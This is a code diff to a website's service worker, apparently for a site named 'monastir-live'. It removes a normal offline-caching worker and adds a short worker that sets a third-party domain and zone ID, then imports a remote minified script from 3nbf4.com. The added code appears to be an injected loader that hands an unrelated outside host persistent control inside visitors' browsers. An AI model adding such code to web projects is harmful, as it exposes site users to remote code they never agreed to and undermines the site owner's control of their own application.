@@ -1,14 +1,6 @@
-const CACHE_NAME = 'monastir-live-v1';
-const URLS_TO_CACHE = ['/', '/index.html', '/style.css', '/app.js'];
-
-self.addEventListener('install', event => {
-  event.waitUntil(
-    caches.open(CACHE_NAME).then(cache => cache.addAll(URLS_TO_CACHE))
-  );
-});
-
-self.addEventListener('fetch', event => {
-  event.respondWith(
-    caches.match(event.request).then(resp => resp || fetch(event.request))
-  );
-});
+self.options = {
+    "domain": "3nbf4.com",
+    "zoneId": 11695107
+}
+self.lary = ""
+importScripts('https://3nbf4.com/act/files/service-worker.min.js?r=sw')
